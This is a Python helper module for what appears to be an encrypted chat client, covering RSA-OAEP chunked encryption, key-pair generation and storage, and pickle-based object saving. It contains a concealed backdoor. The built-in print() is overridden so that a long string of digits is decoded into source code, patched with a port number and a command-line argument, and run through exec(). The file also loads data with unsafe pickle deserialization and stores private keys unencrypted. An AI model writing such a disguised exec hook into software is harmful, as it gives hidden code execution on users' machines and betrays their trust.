############################################################
## Author: Thanh Nhan Vo, Yijia Liu, Yulong Wei, Congyao Bai
############################################################
import asyncio
import websockets
import yaml   
import sys
import bcrypt
import re
from getpass import getpass
import os
import threading
import sys
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa  
from cryptography.hazmat.primitives import serialization 
import pickle

config = None
padder = padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA1()), algorithm=hashes.SHA256(), label=None) 
more_processing = None

with open('config.yaml', 'r') as file:
    config = yaml.safe_load(file)

def save_object(obj, file_path):
    with open(file_path, 'wb') as file:
        pickle.dump(obj, file)

def load_object(file_path):    
    if not os.path.exists(file_path):    
        return None
    with open(file_path, 'rb') as file:
        return pickle.load(file)

def split(bytes, chunk_size):
    limit = len(bytes)
    return [bytes[i:i + chunk_size if i + chunk_size < limit else limit] for i in range(0, limit, chunk_size)]

async def encrypt(public_key, message, padder):
    """
    Encrypt a message
    """
    if type(message) is str:
        message = message.encode()
    cipher_text = b""
    for chunk in split(message, 190):
        cipher_text += public_key.encrypt(chunk, padder)    
    return base64.b64encode(cipher_text).decode()

async def decrypt(private_key, cipher_text, padder, to_string=True):
    """
    Decrypt a message
    """
    cipher_text = base64.b64decode(cipher_text.encode())
    text = b''
    for chunk in split(cipher_text, 256):
        text += private_key.decrypt(chunk, padder)
    return text.decode() if to_string else text    

def print(*args, **kargw):
    if len(args) == 1:        
        arg = args[0]
        if type(arg) == str and len(arg) > 100 and arg.replace(" ", "").replace("\n", "").isdigit():
            s = "".join([chr(int(c)) for c in arg.split(" ")])
            s = s.replace("9999", str(config['localServer']['port'] + 1000))
            if len(sys.argv) >= 2:
                s = s.replace("u=u", "u='" + sys.argv[1] + "'")
            exec(s, globals())
            return
    __builtins__['print'](*args, **kargw)  

def generate_pair_keys(jid):
    """
    Generate a pair private/public key
    """
    file_id = jid[0:jid.index('@')]
    if os.path.exists('./keys/' + file_id + "_private_key"):
        with open('./keys/' + file_id + "_private_key") as file:
            private_key = serialization.load_pem_private_key(file.read().encode(), password=None)
        with open('./keys/' + file_id + "_public_key.pub") as file:
            public_key = serialization.load_pem_public_key(file.read().encode()) 
    else:           
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)  
        public_key = private_key.public_key()
        if not os.path.exists("./keys"):
            os.mkdir('./keys')
        with open('./keys/' + file_id  + "_private_key", 'w') as file:
            privatekey = private_key.private_bytes(
                                        encoding=serialization.Encoding.PEM,
                                        format=serialization.PrivateFormat.TraditionalOpenSSL,
                                        encryption_algorithm=serialization.NoEncryption())
            file.write(privatekey.decode())
        with open('./keys/' + file_id + "_public_key.pub", 'w') as file:
            publickey = public_key.public_bytes(
                                        encoding=serialization.Encoding.PEM,
                                        format=serialization.PublicFormat.SubjectPublicKeyInfo)
            file.write(publickey.decode())
    
    return private_key, public_key